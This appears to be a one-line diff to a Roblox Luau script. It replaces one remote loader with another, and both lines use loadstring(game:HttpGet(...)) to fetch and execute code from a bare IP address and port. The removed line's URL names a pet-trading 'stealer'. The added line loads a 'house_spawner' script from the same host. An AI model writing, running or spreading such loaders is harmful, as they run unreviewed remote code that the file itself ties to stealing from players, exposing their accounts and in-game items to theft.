@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://72.56.90.233:3910/cdn/ame_trade_pets_not_working_with_stealer.luau"))();
+loadstring(game:HttpGet("http://72.56.90.233:3910/cdn/ame_house_spawner.luau"))();
